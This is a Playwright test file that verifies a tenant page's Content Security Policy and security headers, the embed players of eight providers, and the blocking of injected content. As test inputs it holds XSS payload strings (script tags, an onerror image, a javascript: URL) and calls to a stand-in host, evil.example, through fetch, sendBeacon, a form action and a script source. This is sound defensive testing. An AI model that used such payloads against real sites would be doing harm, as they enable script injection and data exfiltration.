import { expect, test, type Page } from "@playwright/test";
import { newBlockId, type Block } from "@/lib/document";
import { cleanupUsers, desktopOnly, rand } from "../fixtures/data";
import { publishDocOf, publishedPage } from "../m2/blocks-helpers";
import { EMBEDS } from "./assets-embeds";
import { armFailure, customHostOf, getCustom, getTenant, rawBuffer, SERVER_PORT, tenantUrl } from "./render-helpers";
import { seedFullPage } from "./assets-seed";

/**
 * M8-07: the policy of a live tenant page, proven in Chrome. The header is exact; the page loads
 * with no violation; every embed provider's player mounts under it; and what the policy forbids is
 * blocked and reported when it is injected into the live DOM, even with the page's own escaping out
 * of the picture. Runs against the dev server or a production build (HL_PROD_PORT); the policy is
 * set by the proxy in both.
 */

test.afterAll(cleanupUsers);
test.describe.configure({ timeout: 180_000 });

const ROOT = `http://localhost:${SERVER_PORT}`;
const FRAME_ORIGINS =
  "https://www.youtube-nocookie.com https://open.spotify.com https://player.vimeo.com https://www.tiktok.com https://www.instagram.com https://w.soundcloud.com https://embed.music.apple.com https://player.twitch.tv https://clips.twitch.tv";
const PAGE_CSP = `default-src 'none'; script-src 'self'; style-src 'unsafe-inline'; font-src 'self'; img-src 'self' ${ROOT}; connect-src 'self'; frame-src ${FRAME_ORIGINS}; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'`;

const SECURITY_HEADERS = {
  "content-security-policy": PAGE_CSP,
  "x-content-type-options": "nosniff",
  "referrer-policy": "strict-origin-when-cross-origin",
  "x-frame-options": "DENY",
};

test.describe("M8-07 the headers of every tenant response", () => {
  test("M8-07 the page, the placeholder, every 404 and the 500 carry the exact policy and the other three headers, with no cookie", async ({ context }, info) => {
    test.skip(!desktopOnly(info), "HTTP-level");
    const live = await publishedPage("hd1", publishDocOf([]), { plan: "studio" });
    const host = await customHostOf(live.pageId);
    const responses: Array<[string, { headers: Record<string, unknown>; status: number }]> = [
      ["page", await getTenant(live.handle)],
      ["page on a custom host", await getCustom(host)],
      ["an unclaimed handle", await getTenant(`zq-nobody-${rand(6)}`)],
      ["a reserved handle", await rawBuffer(`admin.localhost:${SERVER_PORT}`, "/")],
      ["an invalid handle", await rawBuffer(`ab.localhost:${SERVER_PORT}`, "/")],
      ["a sub-path", await getTenant(live.handle, "/anything")],
      ["an unknown custom host", await getCustom(`nobody-${rand(6)}.example.org`)],
      ["a 405", await rawBuffer(`${live.handle}.localhost:${SERVER_PORT}`, "/", { method: "POST" })],
      ["the OG image", await getTenant(live.handle, "/og")],
    ];
    const failing = `zq-failing-${rand(5)}`;
    if (await armFailure(failing)) responses.push(["the 500 panel", await getTenant(failing)]);
    for (const [label, res] of responses) {
      for (const [name, value] of Object.entries(SECURITY_HEADERS)) {
        expect(res.headers[name], `${label}: ${name}`).toBe(value);
      }
      expect(res.headers["set-cookie"], label).toBeUndefined();
    }
    void context;
  });

  test("M8-07 nothing in the header set is built from the request: a spoofed Host, X-Forwarded-Host and X-Original-Host change no value", async ({ context }, info) => {
    test.skip(!desktopOnly(info), "HTTP-level");
    const live = await publishedPage("hd2", publishDocOf([]));
    const plain = await getTenant(live.handle);
    const spoofed = await getTenant(live.handle, "/", {
      "x-forwarded-host": "evil.example",
      "x-original-host": "evil.example",
      forwarded: "host=evil.example",
    });
    for (const name of Object.keys(SECURITY_HEADERS)) {
      expect(spoofed.headers[name], name).toBe(plain.headers[name]);
    }
    // A request that names another host entirely is that host's answer, never a tenant's with its own headers.
    const other = await rawBuffer(`evil.example:${SERVER_PORT}`, "/");
    expect(other.status).toBe(404);
    expect(other.headers["content-security-policy"]).toBe(PAGE_CSP);
    expect(other.text).not.toContain(live.doc.profile.name);
    void context;
  });
});

/** Installs a collector of `securitypolicyviolation` events before any page script runs. */
async function listen(page: Page) {
  const consoleCsp: string[] = [];
  page.on("console", (message) => {
    if (/Content Security Policy|violates the following/i.test(message.text())) {
      consoleCsp.push(message.text());
    }
  });
  await page.addInitScript(() => {
    const w = window as unknown as { __v: { directive: string; blocked: string; sample: string }[] };
    w.__v = [];
    document.addEventListener("securitypolicyviolation", (event) =>
      w.__v.push({
        directive: event.violatedDirective,
        blocked: event.blockedURI,
        sample: event.sample,
      }),
    );
  });
  return {
    consoleCsp,
    violations: () =>
      page.evaluate(
        () => (window as unknown as { __v: { directive: string; blocked: string }[] }).__v,
      ),
  };
}

/** One embed of each of the eight providers. */
const EIGHT: Block[] = ["YouTube", "Spotify track", "Vimeo", "TikTok", "Instagram post", "SoundCloud track", "Apple Music song", "Twitch channel"].map(
  (name) => {
    const embed = EMBEDS.find((candidate) => candidate.name === name)!;
    return { id: newBlockId(), type: "embed", visible: true, url: embed.url, caption: name } as unknown as Block;
  },
);

test.describe("M8-07 the policy in Chrome", () => {
  test("M8-07 the fixture page loads with no violation and no CSP message, and each of the eight providers' players mounts under frame-src", async ({ page }) => {
    const seeded = await seedFullPage("free");
    // The providers' pages are not under test: answer each frame request with an empty document.
    await page.route(/^https:\/\/(www\.youtube-nocookie|open\.spotify|player\.vimeo|www\.tiktok|www\.instagram|w\.soundcloud|embed\.music\.apple|player\.twitch|clips\.twitch)\./, (route) =>
      route.fulfill({ status: 200, contentType: "text/html", body: "<!doctype html><title>player</title>" }),
    );
    const watch = await listen(page);
    await page.goto(seeded.url);
    await page.waitForLoadState("load");
    await page.waitForTimeout(800);
    expect(await watch.violations()).toEqual([]);
    expect(watch.consoleCsp).toEqual([]);

    const eight = await publishedPage("hd3", publishDocOf(EIGHT));
    const watch8 = await listen(page);
    await page.goto(tenantUrl(eight.handle));
    await page.waitForLoadState("load");
    const buttons = page.locator("button.pg-embed-play");
    expect(await buttons.count()).toBe(8);
    for (let i = 0; i < 8; i++) {
      await page.locator("button.pg-embed-play").first().click();
      await expect(page.locator("iframe")).toHaveCount(i + 1);
    }
    const sources = await page.locator("iframe").evaluateAll((frames) => frames.map((f) => (f as HTMLIFrameElement).src));
    expect(sources.map((src) => new URL(src).origin).sort()).toEqual(
      [
        "https://player.twitch.tv",
        "https://embed.music.apple.com",
        "https://open.spotify.com",
        "https://player.vimeo.com",
        "https://w.soundcloud.com",
        "https://www.instagram.com",
        "https://www.tiktok.com",
        "https://www.youtube-nocookie.com",
      ].sort(),
    );
    expect(await watch8.violations()).toEqual([]);
    expect(watch8.consoleCsp).toEqual([]);
  });

  test("M8-07 what the policy forbids is blocked and reported when injected, and what the page needs is not", async ({ page }) => {
    const live = await publishedPage("hd4", publishDocOf([]));
    const watch = await listen(page);
    await page.route("https://evil.example/**", (route) => route.fulfill({ status: 200, body: "" }));
    await page.goto(tenantUrl(live.handle));
    await page.waitForLoadState("load");

    const attempts: Array<[string, string, () => Promise<unknown>]> = [
      ["an inline <script> element", "script-src", () => page.evaluate(() => { const s = document.createElement("script"); s.textContent = "window.__x = 1"; document.body.appendChild(s); })],
      ["an inline onclick handler", "script-src-attr", async () => {
        await page.evaluate(() => document.body.insertAdjacentHTML("beforeend", '<button id="hl-inj" onclick="window.__x = 2">x</button>'));
        await page.locator("#hl-inj").click();
      }],
      ["<script src=https://evil.example/x.js>", "script-src", () => page.evaluate(() => { const s = document.createElement("script"); s.src = "https://evil.example/x.js"; document.body.appendChild(s); })],
      ["<iframe src=https://evil.example>", "frame-src", () => page.evaluate(() => { const f = document.createElement("iframe"); f.src = "https://evil.example/"; document.body.appendChild(f); })],
      ["<iframe src=https://vimeo.com> (not on the list)", "frame-src", () => page.evaluate(() => { const f = document.createElement("iframe"); f.src = "https://vimeo.com/"; document.body.appendChild(f); })],
      ["fetch('https://evil.example')", "connect-src", () => page.evaluate(() => fetch("https://evil.example/").catch(() => undefined))],
      ["sendBeacon('https://evil.example')", "connect-src", () => page.evaluate(() => { navigator.sendBeacon("https://evil.example/", "x"); })],
      ["<img src=https://evil.example/x.png>", "img-src", () => page.evaluate(() => { const i = new Image(); i.src = "https://evil.example/x.png"; document.body.appendChild(i); })],
      ["<link rel=stylesheet href=https://evil.example/x.css>", "style-src", () => page.evaluate(() => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "https://evil.example/x.css"; document.head.appendChild(l); })],
      ["a font from another origin", "font-src", () => page.evaluate(async () => {
        const style = document.createElement("style");
        style.textContent = '@font-face { font-family: "HlEvil"; src: url("https://evil.example/f.woff2") format("woff2"); } .hl-evil { font-family: HlEvil; }';
        document.head.appendChild(style);
        const p = document.createElement("p");
        p.className = "hl-evil";
        p.textContent = "text";
        document.body.appendChild(p);
        await document.fonts.load('16px "HlEvil"').catch(() => undefined);
      })],
      ["a <form action=https://evil.example> submission", "form-action", async () => {
        await page.evaluate(() => {
          document.body.insertAdjacentHTML("beforeend", '<form id="hl-form" action="https://evil.example/" method="post"><button type="submit">go</button></form>');
          (document.getElementById("hl-form") as HTMLFormElement).requestSubmit();
        });
      }],
      ["<object data=...>", "object-src", () => page.evaluate(() => { const o = document.createElement("object"); o.data = `${location.origin}/icon.svg`; document.body.appendChild(o); })],
      ["<embed src=...>", "object-src", () => page.evaluate(() => { const e = document.createElement("embed"); e.src = `${location.origin}/icon.svg`; document.body.appendChild(e); })],
      ["<base href>", "base-uri", () => page.evaluate(() => { const b = document.createElement("base"); b.href = "https://evil.example/"; document.head.appendChild(b); })],
    ];
    for (const [label, directive, run] of attempts) {
      const before = (await watch.violations()).length;
      await run();
      // The violated directive is the specific one (`script-src-elem`, `style-src-elem`, ...): match by family.
      await expect
        .poll(
          async () =>
            (await watch.violations())
              .slice(before)
              .some((v) => v.directive.split(" ")[0]!.startsWith(directive)),
          { message: label, timeout: 5_000 },
        )
        .toBe(true);
    }
    // eval and the Function constructor are blocked for page script. (Playwright's own evaluate is exempt from
    // that rule, so the test serves a script of its own from the page's own origin, which `script-src 'self'`
    // allows, and has it try both. The page's integrity attribute is dropped for this load only.)
    await page.route(tenantUrl(live.handle), async (route) => {
      const response = await route.fetch();
      await route.fulfill({ response, body: (await response.text()).replace(/ integrity="[^"]*"/, "") });
    });
    await page.route(/\/_t\/p\.[0-9a-f]{12}\.js$/, (route) =>
      route.fulfill({
        status: 200,
        contentType: "text/javascript",
        body: "window.__e = []; try { eval('1'); } catch (e) { window.__e.push('eval ' + e.name); } try { new Function('return 1')(); } catch (e) { window.__e.push('Function ' + e.name); }",
      }),
    );
    await page.goto(tenantUrl(live.handle));
    await page.waitForLoadState("load");
    expect(await page.evaluate(() => (window as unknown as { __e?: string[] }).__e)).toEqual(["eval EvalError", "Function EvalError"]);
    const evalViolations = (await watch.violations()).filter((v) => v.directive.startsWith("script-src"));
    expect(evalViolations.length).toBeGreaterThanOrEqual(2);
    // Nothing that would have run, ran.
    expect(await page.evaluate(() => (window as unknown as { __x?: number }).__x)).toBeUndefined();

    // What the page itself needs is not blocked: its own origin for XHR and a beacon, and the media origin for images.
    const before = (await watch.violations()).length;
    const own = await page.evaluate(() => fetch("/icon.svg").then((r) => r.status));
    expect(own).toBe(200);
    await page.evaluate((origin) => {
      const i = new Image();
      i.src = `${origin}/media/00000000-0000-4000-8000-000000000000/none.png`;
      document.body.appendChild(i);
    }, ROOT);
    await page.waitForTimeout(500);
    expect((await watch.violations()).slice(before)).toEqual([]);
  });

  test("M8-07 hostile text in every field is text, nothing runs, and raw copies appended to the live DOM are blocked", async ({ page }) => {
    const hostile = ['<script>window.__x=1</script>', '"><img src=x onerror=window.__x=1>', "</style><script>window.__x=1</script>", "javascript:window.__x=1"];
    const [a, b, c, d] = hostile as [string, string, string, string];
    const blocks = [
      { id: newBlockId(), type: "link", visible: true, label: a, url: "https://example.com/a" },
      { id: newBlockId(), type: "card", visible: true, title: b, caption: c, url: "https://example.com/b", image: null },
      { id: newBlockId(), type: "grid", visible: true, cells: [
        { id: newBlockId(), title: d, subtitle: a, url: "https://example.com/c" },
        { id: newBlockId(), title: b, subtitle: c, url: "https://example.com/c2" },
      ] },
      { id: newBlockId(), type: "text", visible: true, text: `${a} ${b}`, marks: [{ type: "link", start: 0, end: 5, id: newBlockId(), url: "https://example.com/d" }] },
      { id: newBlockId(), type: "image", visible: true, image: { path: "00000000-0000-4000-8000-000000000000/hostile-image-01.png", width: 100, height: 100 }, alt: b, url: "https://example.com/e" },
    ] as unknown as Block[];
    const doc = { ...publishDocOf(blocks, { name: b, bio: c }), share: { title: a, description: b } };
    const hostilePage = await publishedPage("hd5", doc as ReturnType<typeof publishDocOf>);
    const watch = await listen(page);
    let dialog = false;
    page.on("dialog", async (event) => { dialog = true; await event.dismiss(); });
    await page.route(/\/media\//, (route) => route.fulfill({ status: 404, body: "" }));
    await page.goto(tenantUrl(hostilePage.handle));
    await page.waitForLoadState("load");
    await page.waitForTimeout(500);
    expect(await page.evaluate(() => (window as unknown as { __x?: number }).__x)).toBeUndefined();
    expect(dialog).toBe(false);
    expect((await watch.violations()).filter((v) => !/img-src/.test(v.directive))).toEqual([]);
    // It is on the page as text.
    await expect(page.getByText(a, { exact: false }).first()).toBeVisible();
    expect(await page.locator("img[onerror]").count()).toBe(0);

    // Appended as raw HTML, the policy blocks every one that would execute.
    const before = (await watch.violations()).length;
    await page.evaluate((strings) => {
      for (const html of strings) document.body.insertAdjacentHTML("beforeend", html);
    }, hostile);
    await page.waitForTimeout(500);
    expect(await page.evaluate(() => (window as unknown as { __x?: number }).__x)).toBeUndefined();
    expect((await watch.violations()).length).toBeGreaterThan(before);
  });
});
